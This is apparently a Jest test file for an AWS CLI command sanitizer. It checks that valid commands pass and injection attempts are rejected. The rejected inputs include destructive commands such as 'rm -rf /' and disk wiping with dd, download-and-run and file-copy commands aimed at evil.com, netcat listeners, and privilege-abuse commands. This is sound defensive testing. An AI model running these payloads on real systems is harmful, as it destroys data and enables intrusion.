import { sanitizeAwsCliCommand } from "./aws-cli-sanitizer";

describe("sanitizeAwsCliCommand", () => {
  describe("valid commands", () => {
    test("should allow valid AWS CLI commands", () => {
      const validCommands = [
        "s3 ls",
        "dynamodb list-tables",
        "lambda list-functions",
        "ec2 describe-instances",
        "help",
        "version",
        "configure list",
        "sts get-caller-identity",
        "iam list-users",
        "cloudformation list-stacks",
        "s3api list-buckets",
        "logs describe-log-groups",
        "apigateway get-rest-apis",
        "route53 list-hosted-zones",
        "rds describe-db-instances"
      ];

      validCommands.forEach(command => {
        expect(() => sanitizeAwsCliCommand(command)).not.toThrow();
        expect(sanitizeAwsCliCommand(command)).toBe(command.trim());
      });
    });

    test("should trim whitespace from valid commands", () => {
      expect(sanitizeAwsCliCommand("  s3 ls  ")).toBe("s3 ls");
      expect(sanitizeAwsCliCommand("\ts3 ls\n")).toBe("s3 ls");
    });
  });

  describe("empty and invalid commands", () => {
    test("should reject empty commands", () => {
      expect(() => sanitizeAwsCliCommand("")).toThrow("Command cannot be empty");
      expect(() => sanitizeAwsCliCommand("   ")).toThrow("Command cannot be empty");
      expect(() => sanitizeAwsCliCommand("\t\n\r")).toThrow("Command cannot be empty");
    });

    test("should reject commands that don't start with valid AWS patterns", () => {
      const invalidCommands = [
        "ls",
        "123invalid",
        "!@#$%",
        "random-command"
      ];

      invalidCommands.forEach(command => {
        expect(() => sanitizeAwsCliCommand(command))
          .toThrow("Command must start with a valid AWS CLI service or command");
      });
    });
  });

  describe("command chaining and control operators", () => {
    test("should reject OR operator (||)", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls || echo hacked"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject AND operator (&&)", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls && rm -rf /"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject command separator (;)", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls; rm -rf /"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject pipe operator (|)", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls | grep bucket"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject background process (&)", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls &"))
        .toThrow("Command contains forbidden pattern");
    });
  });

  describe("command substitution", () => {
    test("should reject backticks", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls `whoami`"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject $() command substitution", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls $(whoami)"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject ${} command substitution", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls ${USER}"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject environment variables", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls $HOME"))
        .toThrow("Command contains forbidden pattern");
    });
  });

  describe("redirection operators", () => {
    test("should reject output redirection (>)", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls > file.txt"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject input redirection (<)", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls < input.txt"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject append redirection (>>)", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls >> file.txt"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject here document (<<)", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls << EOF"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject error redirection (2>)", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls 2> error.txt"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject combined redirection (&>)", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls &> output.txt"))
        .toThrow("Command contains forbidden pattern");
    });
  });

  describe("control characters", () => {
    test("should reject newlines", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls\nrm -rf /"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject carriage returns", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls\rmalicious"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject tabs", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls\tmalicious"))
        .toThrow("Command contains forbidden pattern");
    });
  });

  describe("path traversal", () => {
    test("should reject parent directory traversal", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls ../"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject path traversal with slash", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls /../"))
        .toThrow("Command contains forbidden pattern");
    });
  });

  describe("function injection", () => {
    test("should reject eval() calls", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls eval(malicious)"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject exec() calls", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls exec(malicious)"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject system() calls", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls system(malicious)"))
        .toThrow("Command contains forbidden pattern");
    });

    test("should reject shell_exec() calls", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls shell_exec(malicious)"))
        .toThrow("Command contains forbidden pattern");
    });
  });

  describe("suspicious commands", () => {
    test("should reject file system operations", () => {
      const dangerousCommands = [
        "s3 ls rm -rf /",
        "s3 ls del important.txt",
        "s3 ls format c:",
        "s3 ls fdisk /dev/sda",
        "s3 ls dd if=/dev/zero of=/dev/sda",
        "s3 ls shred -vfz -n 3 /dev/sda"
      ];

      dangerousCommands.forEach(command => {
        expect(() => sanitizeAwsCliCommand(command))
          .toThrow("Command contains potentially dangerous operation");
      });
    });

    test("should reject network operations", () => {
      const networkCommands = [
        "s3 ls wget http://evil.com/malware",
        "s3 ls curl http://evil.com/malware",
        "s3 ls nc -l 8080",
        "s3 ls netcat -l 8080",
        "s3 ls telnet evil.com 23",
        "s3 ls ssh user@evil.com",
        "s3 ls scp file.txt user@evil.com:",
        "s3 ls rsync -av /home user@evil.com:/backup"
      ];

      networkCommands.forEach(command => {
        expect(() => sanitizeAwsCliCommand(command))
          .toThrow("Command contains potentially dangerous operation");
      });
    });

    test("should reject system administration commands", () => {
      const adminCommands = [
        "s3 ls chmod 777 /etc/passwd",
        "s3 ls chown root /etc/passwd",
        "s3 ls sudo rm -rf /",
        "s3 ls su -",
        "s3 ls useradd hacker",
        "s3 ls usermod -aG sudo hacker",
        "s3 ls crontab -e",
        "s3 ls at now + 1 minute",
        "s3 ls systemctl stop ssh",
        "s3 ls service ssh stop",
        "s3 ls init 0",
        "s3 ls kill -9 1",
        "s3 ls killall init",
        "s3 ls pkill -f ssh",
        "s3 ls shutdown -h now"
      ];

      adminCommands.forEach(command => {
        expect(() => sanitizeAwsCliCommand(command))
          .toThrow("Command contains potentially dangerous operation");
      });
    });
  });

  describe("edge cases", () => {
    test("should handle case-insensitive suspicious command detection", () => {
      expect(() => sanitizeAwsCliCommand("s3 ls RM -RF /"))
        .toThrow("Command contains potentially dangerous operation");
      expect(() => sanitizeAwsCliCommand("s3 ls SUDO rm -rf /"))
        .toThrow("Command contains potentially dangerous operation");
    });

    test("should handle partial matches in suspicious commands", () => {
      // These should NOT throw because they don't contain standalone suspicious commands
      expect(() => sanitizeAwsCliCommand("s3 ls remove")).not.toThrow();
      expect(() => sanitizeAwsCliCommand("s3 ls system")).not.toThrow();
      
      // These SHOULD throw because they contain standalone suspicious commands
      expect(() => sanitizeAwsCliCommand("s3 ls rm file.txt"))
        .toThrow("Command contains potentially dangerous operation");
      expect(() => sanitizeAwsCliCommand("s3 ls systemctl status"))
        .toThrow("Command contains potentially dangerous operation");
    });

    test("should allow AWS commands that contain suspicious words as part of valid AWS operations", () => {
      // These should be allowed as they are valid AWS CLI commands
      expect(() => sanitizeAwsCliCommand("s3api delete-bucket")).not.toThrow();
      expect(() => sanitizeAwsCliCommand("iam delete-user")).not.toThrow();
      expect(() => sanitizeAwsCliCommand("ec2 terminate-instances")).not.toThrow();
    });
  });

  describe("complex injection attempts", () => {
    test("should reject multi-vector injection attempts", () => {
      const complexInjections = [
        "s3 ls; rm -rf /; echo 'hacked'",
        "s3 ls && wget http://evil.com/malware && chmod +x malware",
        "s3 ls | nc -l 8080 | bash",
        "s3 ls `curl http://evil.com/script.sh`",
        "s3 ls $(wget -qO- http://evil.com/script.sh)",
        "s3 ls ${PATH} && rm -rf /",
        "s3 ls > /dev/null; rm -rf /",
        "s3 ls << EOF\nrm -rf /\nEOF"
      ];

      complexInjections.forEach(command => {
        expect(() => sanitizeAwsCliCommand(command)).toThrow();
      });
    });
  });
});
